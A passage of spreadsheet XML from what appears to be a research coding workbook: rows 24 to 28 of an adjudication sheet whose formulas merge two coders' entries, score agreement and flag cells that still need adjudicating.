        <f>IF(OR(AJ24="",AJ24=0),"",ROUND(100*(AJ24-AK24)/AJ24,1))</f>
        <v/>
      </c>
      <c r="AM24" s="11">
        <f>IF(AND(Coder1!AN24=1,Coder2!AN24=1),IF(COUNTBLANK(E24:AH24)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN24" s="11">
        <f>IF(AND(Coder1!AN24=1,Coder2!AN24=1),IF(SUMPRODUCT(--(Coder1!E24:AH24&amp;""&lt;&gt;Coder2!E24:AH24&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO24" s="11" t="n"/>
    </row>
    <row r="25">
      <c r="A25" s="11">
        <f>Coder1!A25</f>
        <v/>
      </c>
      <c r="B25" s="11">
        <f>Coder1!B25</f>
        <v/>
      </c>
      <c r="C25" s="11">
        <f>Coder1!C25</f>
        <v/>
      </c>
      <c r="D25" s="11">
        <f>Coder1!D25</f>
        <v/>
      </c>
      <c r="E25" s="14">
        <f>IF(AND(Coder1!E25&amp;""&lt;&gt;"",Coder1!E25&amp;""=Coder2!E25&amp;""),Coder1!E25,"")</f>
        <v/>
      </c>
      <c r="F25" s="14">
        <f>IF(AND(Coder1!F25&amp;""&lt;&gt;"",Coder1!F25&amp;""=Coder2!F25&amp;""),Coder1!F25,"")</f>
        <v/>
      </c>
      <c r="G25" s="14">
        <f>IF(AND(Coder1!G25&amp;""&lt;&gt;"",Coder1!G25&amp;""=Coder2!G25&amp;""),Coder1!G25,"")</f>
        <v/>
      </c>
      <c r="H25" s="14">
        <f>IF(AND(Coder1!H25&amp;""&lt;&gt;"",Coder1!H25&amp;""=Coder2!H25&amp;""),Coder1!H25,"")</f>
        <v/>
      </c>
      <c r="I25" s="14">
        <f>IF(AND(Coder1!I25&amp;""&lt;&gt;"",Coder1!I25&amp;""=Coder2!I25&amp;""),Coder1!I25,"")</f>
        <v/>
      </c>
      <c r="J25" s="14">
        <f>IF(AND(Coder1!J25&amp;""&lt;&gt;"",Coder1!J25&amp;""=Coder2!J25&amp;""),Coder1!J25,"")</f>
        <v/>
      </c>
      <c r="K25" s="14">
        <f>IF(AND(Coder1!K25&amp;""&lt;&gt;"",Coder1!K25&amp;""=Coder2!K25&amp;""),Coder1!K25,"")</f>
        <v/>
      </c>
      <c r="L25" s="14">
        <f>IF(AND(Coder1!L25&amp;""&lt;&gt;"",Coder1!L25&amp;""=Coder2!L25&amp;""),Coder1!L25,"")</f>
        <v/>
      </c>
      <c r="M25" s="14">
        <f>IF(AND(Coder1!M25&amp;""&lt;&gt;"",Coder1!M25&amp;""=Coder2!M25&amp;""),Coder1!M25,"")</f>
        <v/>
      </c>
      <c r="N25" s="14">
        <f>IF(AND(Coder1!N25&amp;""&lt;&gt;"",Coder1!N25&amp;""=Coder2!N25&amp;""),Coder1!N25,"")</f>
        <v/>
      </c>
      <c r="O25" s="14">
        <f>IF(AND(Coder1!O25&amp;""&lt;&gt;"",Coder1!O25&amp;""=Coder2!O25&amp;""),Coder1!O25,"")</f>
        <v/>
      </c>
      <c r="P25" s="14">
        <f>IF(AND(Coder1!P25&amp;""&lt;&gt;"",Coder1!P25&amp;""=Coder2!P25&amp;""),Coder1!P25,"")</f>
        <v/>
      </c>
      <c r="Q25" s="14">
        <f>IF(AND(Coder1!Q25&amp;""&lt;&gt;"",Coder1!Q25&amp;""=Coder2!Q25&amp;""),Coder1!Q25,"")</f>
        <v/>
      </c>
      <c r="R25" s="14">
        <f>IF(AND(Coder1!R25&amp;""&lt;&gt;"",Coder1!R25&amp;""=Coder2!R25&amp;""),Coder1!R25,"")</f>
        <v/>
      </c>
      <c r="S25" s="14">
        <f>IF(AND(Coder1!S25&amp;""&lt;&gt;"",Coder1!S25&amp;""=Coder2!S25&amp;""),Coder1!S25,"")</f>
        <v/>
      </c>
      <c r="T25" s="14">
        <f>IF(AND(Coder1!T25&amp;""&lt;&gt;"",Coder1!T25&amp;""=Coder2!T25&amp;""),Coder1!T25,"")</f>
        <v/>
      </c>
      <c r="U25" s="14">
        <f>IF(AND(Coder1!U25&amp;""&lt;&gt;"",Coder1!U25&amp;""=Coder2!U25&amp;""),Coder1!U25,"")</f>
        <v/>
      </c>
      <c r="V25" s="14">
        <f>IF(AND(Coder1!V25&amp;""&lt;&gt;"",Coder1!V25&amp;""=Coder2!V25&amp;""),Coder1!V25,"")</f>
        <v/>
      </c>
      <c r="W25" s="14">
        <f>IF(AND(Coder1!W25&amp;""&lt;&gt;"",Coder1!W25&amp;""=Coder2!W25&amp;""),Coder1!W25,"")</f>
        <v/>
      </c>
      <c r="X25" s="14">
        <f>IF(AND(Coder1!X25&amp;""&lt;&gt;"",Coder1!X25&amp;""=Coder2!X25&amp;""),Coder1!X25,"")</f>
        <v/>
      </c>
      <c r="Y25" s="14">
        <f>IF(AND(Coder1!Y25&amp;""&lt;&gt;"",Coder1!Y25&amp;""=Coder2!Y25&amp;""),Coder1!Y25,"")</f>
        <v/>
      </c>
      <c r="Z25" s="14">
        <f>IF(AND(Coder1!Z25&amp;""&lt;&gt;"",Coder1!Z25&amp;""=Coder2!Z25&amp;""),Coder1!Z25,"")</f>
        <v/>
      </c>
      <c r="AA25" s="14">
        <f>IF(AND(Coder1!AA25&amp;""&lt;&gt;"",Coder1!AA25&amp;""=Coder2!AA25&amp;""),Coder1!AA25,"")</f>
        <v/>
      </c>
      <c r="AB25" s="14">
        <f>IF(AND(Coder1!AB25&amp;""&lt;&gt;"",Coder1!AB25&amp;""=Coder2!AB25&amp;""),Coder1!AB25,"")</f>
        <v/>
      </c>
      <c r="AC25" s="14">
        <f>IF(AND(Coder1!AC25&amp;""&lt;&gt;"",Coder1!AC25&amp;""=Coder2!AC25&amp;""),Coder1!AC25,"")</f>
        <v/>
      </c>
      <c r="AD25" s="14">
        <f>IF(AND(Coder1!AD25&amp;""&lt;&gt;"",Coder1!AD25&amp;""=Coder2!AD25&amp;""),Coder1!AD25,"")</f>
        <v/>
      </c>
      <c r="AE25" s="14">
        <f>IF(AND(Coder1!AE25&amp;""&lt;&gt;"",Coder1!AE25&amp;""=Coder2!AE25&amp;""),Coder1!AE25,"")</f>
        <v/>
      </c>
      <c r="AF25" s="14">
        <f>IF(AND(Coder1!AF25&amp;""&lt;&gt;"",Coder1!AF25&amp;""=Coder2!AF25&amp;""),Coder1!AF25,"")</f>
        <v/>
      </c>
      <c r="AG25" s="14">
        <f>IF(AND(Coder1!AG25&amp;""&lt;&gt;"",Coder1!AG25&amp;""=Coder2!AG25&amp;""),Coder1!AG25,"")</f>
        <v/>
      </c>
      <c r="AH25" s="14">
        <f>IF(AND(Coder1!AH25&amp;""&lt;&gt;"",Coder1!AH25&amp;""=Coder2!AH25&amp;""),Coder1!AH25,"")</f>
        <v/>
      </c>
      <c r="AI25" s="11">
        <f>IF(COUNT(E25:L25)=0,"",SUM(E25:L25))</f>
        <v/>
      </c>
      <c r="AJ25" s="11">
        <f>IF(AI25="","",N(E25)*3+N(F25)*2+N(G25)*2+N(H25)*2+N(I25)*2+N(J25)*3+N(K25)*3+N(L25)*3)</f>
        <v/>
      </c>
      <c r="AK25" s="11">
        <f>IF(AI25="","",COUNTIF(N25:AG25,1))</f>
        <v/>
      </c>
      <c r="AL25" s="11">
        <f>IF(OR(AJ25="",AJ25=0),"",ROUND(100*(AJ25-AK25)/AJ25,1))</f>
        <v/>
      </c>
      <c r="AM25" s="11">
        <f>IF(AND(Coder1!AN25=1,Coder2!AN25=1),IF(COUNTBLANK(E25:AH25)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN25" s="11">
        <f>IF(AND(Coder1!AN25=1,Coder2!AN25=1),IF(SUMPRODUCT(--(Coder1!E25:AH25&amp;""&lt;&gt;Coder2!E25:AH25&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO25" s="11" t="n"/>
    </row>
    <row r="26">
      <c r="A26" s="11">
        <f>Coder1!A26</f>
        <v/>
      </c>
      <c r="B26" s="11">
        <f>Coder1!B26</f>
        <v/>
      </c>
      <c r="C26" s="11">
        <f>Coder1!C26</f>
        <v/>
      </c>
      <c r="D26" s="11">
        <f>Coder1!D26</f>
        <v/>
      </c>
      <c r="E26" s="14">
        <f>IF(AND(Coder1!E26&amp;""&lt;&gt;"",Coder1!E26&amp;""=Coder2!E26&amp;""),Coder1!E26,"")</f>
        <v/>
      </c>
      <c r="F26" s="14">
        <f>IF(AND(Coder1!F26&amp;""&lt;&gt;"",Coder1!F26&amp;""=Coder2!F26&amp;""),Coder1!F26,"")</f>
        <v/>
      </c>
      <c r="G26" s="14">
        <f>IF(AND(Coder1!G26&amp;""&lt;&gt;"",Coder1!G26&amp;""=Coder2!G26&amp;""),Coder1!G26,"")</f>
        <v/>
      </c>
      <c r="H26" s="14">
        <f>IF(AND(Coder1!H26&amp;""&lt;&gt;"",Coder1!H26&amp;""=Coder2!H26&amp;""),Coder1!H26,"")</f>
        <v/>
      </c>
      <c r="I26" s="14">
        <f>IF(AND(Coder1!I26&amp;""&lt;&gt;"",Coder1!I26&amp;""=Coder2!I26&amp;""),Coder1!I26,"")</f>
        <v/>
      </c>
      <c r="J26" s="14">
        <f>IF(AND(Coder1!J26&amp;""&lt;&gt;"",Coder1!J26&amp;""=Coder2!J26&amp;""),Coder1!J26,"")</f>
        <v/>
      </c>
      <c r="K26" s="14">
        <f>IF(AND(Coder1!K26&amp;""&lt;&gt;"",Coder1!K26&amp;""=Coder2!K26&amp;""),Coder1!K26,"")</f>
        <v/>
      </c>
      <c r="L26" s="14">
        <f>IF(AND(Coder1!L26&amp;""&lt;&gt;"",Coder1!L26&amp;""=Coder2!L26&amp;""),Coder1!L26,"")</f>
        <v/>
      </c>
      <c r="M26" s="14">
        <f>IF(AND(Coder1!M26&amp;""&lt;&gt;"",Coder1!M26&amp;""=Coder2!M26&amp;""),Coder1!M26,"")</f>
        <v/>
      </c>
      <c r="N26" s="14">
        <f>IF(AND(Coder1!N26&amp;""&lt;&gt;"",Coder1!N26&amp;""=Coder2!N26&amp;""),Coder1!N26,"")</f>
        <v/>
      </c>
      <c r="O26" s="14">
        <f>IF(AND(Coder1!O26&amp;""&lt;&gt;"",Coder1!O26&amp;""=Coder2!O26&amp;""),Coder1!O26,"")</f>
        <v/>
      </c>
      <c r="P26" s="14">
        <f>IF(AND(Coder1!P26&amp;""&lt;&gt;"",Coder1!P26&amp;""=Coder2!P26&amp;""),Coder1!P26,"")</f>
        <v/>
      </c>
      <c r="Q26" s="14">
        <f>IF(AND(Coder1!Q26&amp;""&lt;&gt;"",Coder1!Q26&amp;""=Coder2!Q26&amp;""),Coder1!Q26,"")</f>
        <v/>
      </c>
      <c r="R26" s="14">
        <f>IF(AND(Coder1!R26&amp;""&lt;&gt;"",Coder1!R26&amp;""=Coder2!R26&amp;""),Coder1!R26,"")</f>
        <v/>
      </c>
      <c r="S26" s="14">
        <f>IF(AND(Coder1!S26&amp;""&lt;&gt;"",Coder1!S26&amp;""=Coder2!S26&amp;""),Coder1!S26,"")</f>
        <v/>
      </c>
      <c r="T26" s="14">
        <f>IF(AND(Coder1!T26&amp;""&lt;&gt;"",Coder1!T26&amp;""=Coder2!T26&amp;""),Coder1!T26,"")</f>
        <v/>
      </c>
      <c r="U26" s="14">
        <f>IF(AND(Coder1!U26&amp;""&lt;&gt;"",Coder1!U26&amp;""=Coder2!U26&amp;""),Coder1!U26,"")</f>
        <v/>
      </c>
      <c r="V26" s="14">
        <f>IF(AND(Coder1!V26&amp;""&lt;&gt;"",Coder1!V26&amp;""=Coder2!V26&amp;""),Coder1!V26,"")</f>
        <v/>
      </c>
      <c r="W26" s="14">
        <f>IF(AND(Coder1!W26&amp;""&lt;&gt;"",Coder1!W26&amp;""=Coder2!W26&amp;""),Coder1!W26,"")</f>
        <v/>
      </c>
      <c r="X26" s="14">
        <f>IF(AND(Coder1!X26&amp;""&lt;&gt;"",Coder1!X26&amp;""=Coder2!X26&amp;""),Coder1!X26,"")</f>
        <v/>
      </c>
      <c r="Y26" s="14">
        <f>IF(AND(Coder1!Y26&amp;""&lt;&gt;"",Coder1!Y26&amp;""=Coder2!Y26&amp;""),Coder1!Y26,"")</f>
        <v/>
      </c>
      <c r="Z26" s="14">
        <f>IF(AND(Coder1!Z26&amp;""&lt;&gt;"",Coder1!Z26&amp;""=Coder2!Z26&amp;""),Coder1!Z26,"")</f>
        <v/>
      </c>
      <c r="AA26" s="14">
        <f>IF(AND(Coder1!AA26&amp;""&lt;&gt;"",Coder1!AA26&amp;""=Coder2!AA26&amp;""),Coder1!AA26,"")</f>
        <v/>
      </c>
      <c r="AB26" s="14">
        <f>IF(AND(Coder1!AB26&amp;""&lt;&gt;"",Coder1!AB26&amp;""=Coder2!AB26&amp;""),Coder1!AB26,"")</f>
        <v/>
      </c>
      <c r="AC26" s="14">
        <f>IF(AND(Coder1!AC26&amp;""&lt;&gt;"",Coder1!AC26&amp;""=Coder2!AC26&amp;""),Coder1!AC26,"")</f>
        <v/>
      </c>
      <c r="AD26" s="14">
        <f>IF(AND(Coder1!AD26&amp;""&lt;&gt;"",Coder1!AD26&amp;""=Coder2!AD26&amp;""),Coder1!AD26,"")</f>
        <v/>
      </c>
      <c r="AE26" s="14">
        <f>IF(AND(Coder1!AE26&amp;""&lt;&gt;"",Coder1!AE26&amp;""=Coder2!AE26&amp;""),Coder1!AE26,"")</f>
        <v/>
      </c>
      <c r="AF26" s="14">
        <f>IF(AND(Coder1!AF26&amp;""&lt;&gt;"",Coder1!AF26&amp;""=Coder2!AF26&amp;""),Coder1!AF26,"")</f>
        <v/>
      </c>
      <c r="AG26" s="14">
        <f>IF(AND(Coder1!AG26&amp;""&lt;&gt;"",Coder1!AG26&amp;""=Coder2!AG26&amp;""),Coder1!AG26,"")</f>
        <v/>
      </c>
      <c r="AH26" s="14">
        <f>IF(AND(Coder1!AH26&amp;""&lt;&gt;"",Coder1!AH26&amp;""=Coder2!AH26&amp;""),Coder1!AH26,"")</f>
        <v/>
      </c>
      <c r="AI26" s="11">
        <f>IF(COUNT(E26:L26)=0,"",SUM(E26:L26))</f>
        <v/>
      </c>
      <c r="AJ26" s="11">
        <f>IF(AI26="","",N(E26)*3+N(F26)*2+N(G26)*2+N(H26)*2+N(I26)*2+N(J26)*3+N(K26)*3+N(L26)*3)</f>
        <v/>
      </c>
      <c r="AK26" s="11">
        <f>IF(AI26="","",COUNTIF(N26:AG26,1))</f>
        <v/>
      </c>
      <c r="AL26" s="11">
        <f>IF(OR(AJ26="",AJ26=0),"",ROUND(100*(AJ26-AK26)/AJ26,1))</f>
        <v/>
      </c>
      <c r="AM26" s="11">
        <f>IF(AND(Coder1!AN26=1,Coder2!AN26=1),IF(COUNTBLANK(E26:AH26)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN26" s="11">
        <f>IF(AND(Coder1!AN26=1,Coder2!AN26=1),IF(SUMPRODUCT(--(Coder1!E26:AH26&amp;""&lt;&gt;Coder2!E26:AH26&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO26" s="11" t="n"/>
    </row>
    <row r="27">
      <c r="A27" s="11">
        <f>Coder1!A27</f>
        <v/>
      </c>
      <c r="B27" s="11">
        <f>Coder1!B27</f>
        <v/>
      </c>
      <c r="C27" s="11">
        <f>Coder1!C27</f>
        <v/>
      </c>
      <c r="D27" s="11">
        <f>Coder1!D27</f>
        <v/>
      </c>
      <c r="E27" s="14">
        <f>IF(AND(Coder1!E27&amp;""&lt;&gt;"",Coder1!E27&amp;""=Coder2!E27&amp;""),Coder1!E27,"")</f>
        <v/>
      </c>
      <c r="F27" s="14">
        <f>IF(AND(Coder1!F27&amp;""&lt;&gt;"",Coder1!F27&amp;""=Coder2!F27&amp;""),Coder1!F27,"")</f>
        <v/>
      </c>
      <c r="G27" s="14">
        <f>IF(AND(Coder1!G27&amp;""&lt;&gt;"",Coder1!G27&amp;""=Coder2!G27&amp;""),Coder1!G27,"")</f>
        <v/>
      </c>
      <c r="H27" s="14">
        <f>IF(AND(Coder1!H27&amp;""&lt;&gt;"",Coder1!H27&amp;""=Coder2!H27&amp;""),Coder1!H27,"")</f>
        <v/>
      </c>
      <c r="I27" s="14">
        <f>IF(AND(Coder1!I27&amp;""&lt;&gt;"",Coder1!I27&amp;""=Coder2!I27&amp;""),Coder1!I27,"")</f>
        <v/>
      </c>
      <c r="J27" s="14">
        <f>IF(AND(Coder1!J27&amp;""&lt;&gt;"",Coder1!J27&amp;""=Coder2!J27&amp;""),Coder1!J27,"")</f>
        <v/>
      </c>
      <c r="K27" s="14">
        <f>IF(AND(Coder1!K27&amp;""&lt;&gt;"",Coder1!K27&amp;""=Coder2!K27&amp;""),Coder1!K27,"")</f>
        <v/>
      </c>
      <c r="L27" s="14">
        <f>IF(AND(Coder1!L27&amp;""&lt;&gt;"",Coder1!L27&amp;""=Coder2!L27&amp;""),Coder1!L27,"")</f>
        <v/>
      </c>
      <c r="M27" s="14">
        <f>IF(AND(Coder1!M27&amp;""&lt;&gt;"",Coder1!M27&amp;""=Coder2!M27&amp;""),Coder1!M27,"")</f>
        <v/>
      </c>
      <c r="N27" s="14">
        <f>IF(AND(Coder1!N27&amp;""&lt;&gt;"",Coder1!N27&amp;""=Coder2!N27&amp;""),Coder1!N27,"")</f>
        <v/>
      </c>
      <c r="O27" s="14">
        <f>IF(AND(Coder1!O27&amp;""&lt;&gt;"",Coder1!O27&amp;""=Coder2!O27&amp;""),Coder1!O27,"")</f>
        <v/>
      </c>
      <c r="P27" s="14">
        <f>IF(AND(Coder1!P27&amp;""&lt;&gt;"",Coder1!P27&amp;""=Coder2!P27&amp;""),Coder1!P27,"")</f>
        <v/>
      </c>
      <c r="Q27" s="14">
        <f>IF(AND(Coder1!Q27&amp;""&lt;&gt;"",Coder1!Q27&amp;""=Coder2!Q27&amp;""),Coder1!Q27,"")</f>
        <v/>
      </c>
      <c r="R27" s="14">
        <f>IF(AND(Coder1!R27&amp;""&lt;&gt;"",Coder1!R27&amp;""=Coder2!R27&amp;""),Coder1!R27,"")</f>
        <v/>
      </c>
      <c r="S27" s="14">
        <f>IF(AND(Coder1!S27&amp;""&lt;&gt;"",Coder1!S27&amp;""=Coder2!S27&amp;""),Coder1!S27,"")</f>
        <v/>
      </c>
      <c r="T27" s="14">
        <f>IF(AND(Coder1!T27&amp;""&lt;&gt;"",Coder1!T27&amp;""=Coder2!T27&amp;""),Coder1!T27,"")</f>
        <v/>
      </c>
      <c r="U27" s="14">
        <f>IF(AND(Coder1!U27&amp;""&lt;&gt;"",Coder1!U27&amp;""=Coder2!U27&amp;""),Coder1!U27,"")</f>
        <v/>
      </c>
      <c r="V27" s="14">
        <f>IF(AND(Coder1!V27&amp;""&lt;&gt;"",Coder1!V27&amp;""=Coder2!V27&amp;""),Coder1!V27,"")</f>
        <v/>
      </c>
      <c r="W27" s="14">
        <f>IF(AND(Coder1!W27&amp;""&lt;&gt;"",Coder1!W27&amp;""=Coder2!W27&amp;""),Coder1!W27,"")</f>
        <v/>
      </c>
      <c r="X27" s="14">
        <f>IF(AND(Coder1!X27&amp;""&lt;&gt;"",Coder1!X27&amp;""=Coder2!X27&amp;""),Coder1!X27,"")</f>
        <v/>
      </c>
      <c r="Y27" s="14">
        <f>IF(AND(Coder1!Y27&amp;""&lt;&gt;"",Coder1!Y27&amp;""=Coder2!Y27&amp;""),Coder1!Y27,"")</f>
        <v/>
      </c>
      <c r="Z27" s="14">
        <f>IF(AND(Coder1!Z27&amp;""&lt;&gt;"",Coder1!Z27&amp;""=Coder2!Z27&amp;""),Coder1!Z27,"")</f>
        <v/>
      </c>
      <c r="AA27" s="14">
        <f>IF(AND(Coder1!AA27&amp;""&lt;&gt;"",Coder1!AA27&amp;""=Coder2!AA27&amp;""),Coder1!AA27,"")</f>
        <v/>
      </c>
      <c r="AB27" s="14">
        <f>IF(AND(Coder1!AB27&amp;""&lt;&gt;"",Coder1!AB27&amp;""=Coder2!AB27&amp;""),Coder1!AB27,"")</f>
        <v/>
      </c>
      <c r="AC27" s="14">
        <f>IF(AND(Coder1!AC27&amp;""&lt;&gt;"",Coder1!AC27&amp;""=Coder2!AC27&amp;""),Coder1!AC27,"")</f>
        <v/>
      </c>
      <c r="AD27" s="14">
        <f>IF(AND(Coder1!AD27&amp;""&lt;&gt;"",Coder1!AD27&amp;""=Coder2!AD27&amp;""),Coder1!AD27,"")</f>
        <v/>
      </c>
      <c r="AE27" s="14">
        <f>IF(AND(Coder1!AE27&amp;""&lt;&gt;"",Coder1!AE27&amp;""=Coder2!AE27&amp;""),Coder1!AE27,"")</f>
        <v/>
      </c>
      <c r="AF27" s="14">
        <f>IF(AND(Coder1!AF27&amp;""&lt;&gt;"",Coder1!AF27&amp;""=Coder2!AF27&amp;""),Coder1!AF27,"")</f>
        <v/>
      </c>
      <c r="AG27" s="14">
        <f>IF(AND(Coder1!AG27&amp;""&lt;&gt;"",Coder1!AG27&amp;""=Coder2!AG27&amp;""),Coder1!AG27,"")</f>
        <v/>
      </c>
      <c r="AH27" s="14">
        <f>IF(AND(Coder1!AH27&amp;""&lt;&gt;"",Coder1!AH27&amp;""=Coder2!AH27&amp;""),Coder1!AH27,"")</f>
        <v/>
      </c>
      <c r="AI27" s="11">
        <f>IF(COUNT(E27:L27)=0,"",SUM(E27:L27))</f>
        <v/>
      </c>
      <c r="AJ27" s="11">
        <f>IF(AI27="","",N(E27)*3+N(F27)*2+N(G27)*2+N(H27)*2+N(I27)*2+N(J27)*3+N(K27)*3+N(L27)*3)</f>
        <v/>
      </c>
      <c r="AK27" s="11">
        <f>IF(AI27="","",COUNTIF(N27:AG27,1))</f>
        <v/>
      </c>
      <c r="AL27" s="11">
        <f>IF(OR(AJ27="",AJ27=0),"",ROUND(100*(AJ27-AK27)/AJ27,1))</f>
        <v/>
      </c>
      <c r="AM27" s="11">
        <f>IF(AND(Coder1!AN27=1,Coder2!AN27=1),IF(COUNTBLANK(E27:AH27)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN27" s="11">
        <f>IF(AND(Coder1!AN27=1,Coder2!AN27=1),IF(SUMPRODUCT(--(Coder1!E27:AH27&amp;""&lt;&gt;Coder2!E27:AH27&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO27" s="11" t="n"/>
    </row>
    <row r="28">
      <c r="A28" s="11">
        <f>Coder1!A28</f>
        <v/>
      </c>
      <c r="B28" s="11">
        <f>Coder1!B28</f>
        <v/>
      </c>
      <c r="C28" s="11">
        <f>Coder1!C28</f>
        <v/>
      </c>
      <c r="D28" s="11">
        <f>Coder1!D28</f>
        <v/>
      </c>
      <c r="E28" s="14">
        <f>IF(AND(Coder1!E28&amp;""&lt;&gt;"",Coder1!E28&amp;""=Coder2!E28&amp;""),Coder1!E28,"")</f>
        <v/>
      </c>
      <c r="F28" s="14">
        <f>IF(AND(Coder1!F28&amp;""&lt;&gt;"",Coder1!F28&amp;""=Coder2!F28&amp;""),Coder1!F28,"")</f>
        <v/>
      </c>
      <c r="G28" s="14">
        <f>IF(AND(Coder1!G28&amp;""&lt;&gt;"",Coder1!G28&amp;""=Coder2!G28&amp;""),Coder1!G28,"")</f>
        <v/>
      </c>
      <c r="H28" s="14">
        <f>IF(AND(Coder1!H28&amp;""&lt;&gt;"",Coder1!H28&amp;""=Coder2!H28&amp;""),Coder1!H28,"")</f>
        <v/>
      </c>
      <c r="I28" s="14">
        <f>IF(AND(Coder1!I28&amp;""&lt;&gt;"",Coder1!I28&amp;""=Coder2!I28&amp;""),Coder1!I28,"")</f>
        <v/>
      </c>
      <c r="J28" s="14">
        <f>IF(AND(Coder1!J28&amp;""&lt;&gt;"",Coder1!J28&amp;""=Coder2!J28&amp;""),Coder1!J28,"")</f>
        <v/>
      </c>
      <c r="K28" s="14">
        <f>IF(AND(Coder1!K28&amp;""&lt;&gt;"",Coder1!K28&amp;""=Coder2!K28&amp;""),Coder1!K28,"")</f>
        <v/>
      </c>
      <c r="L28" s="14">
        <f>IF(AND(Coder1!L28&amp;""&lt;&gt;"",Coder1!L28&amp;""=Coder2!L28&amp;""),Coder1!L28,"")</f>
        <v/>
      </c>
      <c r="M28" s="14">
        <f>IF(AND(Coder1!M28&amp;""&lt;&gt;"",Coder1!M28&amp;""=Coder2!M28&amp;""),Coder1!M28,"")</f>
        <v/>
      </c>
      <c r="N28" s="14">
        <f>IF(AND(Coder1!N28&amp;""&lt;&gt;"",Coder1!N28&amp;""=Coder2!N28&amp;""),Coder1!N28,"")</f>
        <v/>
      </c>
      <c r="O28" s="14">
        <f>IF(AND(Coder1!O28&amp;""&lt;&gt;"",Coder1!O28&amp;""=Coder2!O28&amp;""),Coder1!O28,"")</f>
        <v/>
      </c>
      <c r="P28" s="14">
        <f>IF(AND(Coder1!P28&amp;""&lt;&gt;"",Coder1!P28&amp;""=Coder2!P28&amp;""),Coder1!P28,"")</f>
        <v/>
      </c>
      <c r="Q28" s="14">
        <f>IF(AND(Coder1!Q28&amp;""&lt;&gt;"",Coder1!Q28&amp;""=Coder2!Q28&amp;""),Coder1!Q28,"")</f>
        <v/>
      </c>
      <c r="R28" s="14">
        <f>IF(AND(Coder1!R28&amp;""&lt;&gt;"",Coder1!R28&amp;""=Coder2!R28&amp;""),Coder1!R28,"")</f>
        <v/>
      </c>
      <c r="S28" s="14">
        <f>IF(AND(Coder1!S28&amp;""&lt;&gt;"",Coder1!S28&amp;""=Coder2!S28&amp;""),Coder1!S28,"")</f>
        <v/>
      </c>
      <c r="T28" s="14">
        <f>IF(AND(Coder1!T28&amp;""&lt;&gt;"",Coder1!T28&amp;""=Coder2!T28&amp;""),Coder1!T28,"")</f>
        <v/>
      </c>
      <c r="U28" s="14">
        <f>IF(AND(Coder1!U28&amp;""&lt;&gt;"",Coder1!U28&amp;""=Coder2!U28&amp;""),Coder1!U28,"")</f>
        <v/>
      </c>
      <c r="V28" s="14">
        <f>IF(AND(Coder1!V28&amp;""&lt;&gt;"",Coder1!V28&amp;""=Coder2!V28&amp;""),Coder1!V28,"")</f>
        <v/>
      </c>
      <c r="W28" s="14">
        <f>IF(AND(Coder1!W28&amp;""&lt;&gt;"",Coder1!W28&amp;""=Coder2!W28&amp;""),Coder1!W28,"")</f>
        <v/>
      </c>
      <c r="X28" s="14">
        <f>IF(AND(Coder1!X28&amp;""&lt;&gt;"",Coder1!X28&amp;""=Coder2!X28&amp;""),Coder1!X28,"")</f>
        <v/>
      </c>
      <c r="Y28" s="14">
        <f>IF(AND(Coder1!Y28&amp;""&lt;&gt;"",Coder1!Y28&amp;""=Coder2!Y28&amp;""),Coder1!Y28,"")</f>
        <v/>
      </c>
      <c r="Z28" s="14">
        <f>IF(AND(Coder1!Z28&amp;""&lt;&gt;"",Coder1!Z28&amp;""=Coder2!Z28&amp;""),Coder1!Z28,"")</f>
        <v/>
      </c>
      <c r="AA28" s="14">
        <f>IF(AND(Coder1!AA28&amp;""&lt;&gt;"",Coder1!AA28&amp;""=Coder2!AA28&amp;""),Coder1!AA28,"")</f>
        <v/>
      </c>
      <c r="AB28" s="14">
        <f>IF(AND(Coder1!AB28&amp;""&lt;&gt;"",Coder1!AB28&amp;""=Coder2!AB28&amp;""),Coder1!AB28,"")</f>
        <v/>
      </c>
      <c r="AC28" s="14">
        <f>IF(AND(Coder1!AC28&amp;""&lt;&gt;"",Coder1!AC28&amp;""=Coder2!AC28&amp;""),Coder1!AC28,"")</f>
        <v/>
      </c>
      <c r="AD28" s="14">
        <f>IF(AND(Coder1!AD28&amp;""&lt;&gt;"",Coder1!AD28&amp;""=Coder2!AD28&amp;""),Coder1!AD28,"")</f>
        <v/>
      </c>
      <c r="AE28" s="14">
        <f>IF(AND(Coder1!AE28&amp;""&lt;&gt;"",Coder1!AE28&amp;""=Coder2!AE28&amp;""),Coder1!AE28,"")</f>
        <v/>
      </c>
      <c r="AF28" s="14">
        <f>IF(AND(Coder1!AF28&amp;""&lt;&gt;"",Coder1!AF28&amp;""=Coder2!AF28&amp;""),Coder1!AF28,"")</f>
        <v/>
      </c>
      <c r="AG28" s="14">
        <f>IF(AND(Coder1!AG28&amp;""&lt;&gt;"",Coder1!AG28&amp;""=Coder2!AG28&amp;""),Coder1!AG28,"")</f>
        <v/>
      </c>
      <c r="AH28" s="14">
        <f>IF(AND(Coder1!AH28&amp;""&lt;&gt;"",Coder1!AH28&amp;""=Coder2!AH28&amp;""),Coder1!AH28,"")</f>
        <v/>
      </c>
      <c r="AI28" s="11">
        <f>IF(COUNT(E28:L28)=0,"",SUM(E28:L28))</f>
        <v/>
      </c>
      <c r="AJ28" s="11">
        <f>IF(AI28="","",N(E28)*3+N(F28)*2+N(G28)*2+N(H28)*2+N(I28)*2+N(J28)*3+N(K28)*3+N(L28)*3)</f>
        <v/>
      </c>
      <c r="AK28" s="11">
        <f>IF(AI28="","",COUNTIF(N28:AG28,1))</f>
        <v/>
      </c>
      <c r="AL28" s="11">
        <f>IF(OR(AJ28="",AJ28=0),"",ROUND(100*(AJ28-AK28)/AJ28,1))</f>
        <v/>
      </c>
      <c r="AM28" s="11">
        <f>IF(AND(Coder1!AN28=1,Coder2!AN28=1),IF(COUNTBLANK(E28:AH28)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN28" s="11">
        <f>IF(AND(Coder1!AN28=1,Coder2!AN28=1),IF(SUMPRODUCT(--(Coder1!E28:AH28&amp;""&lt;&gt;Coder2!E28:AH28&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO28" s="11" t="n"/>
    </row>
    <row r="29">
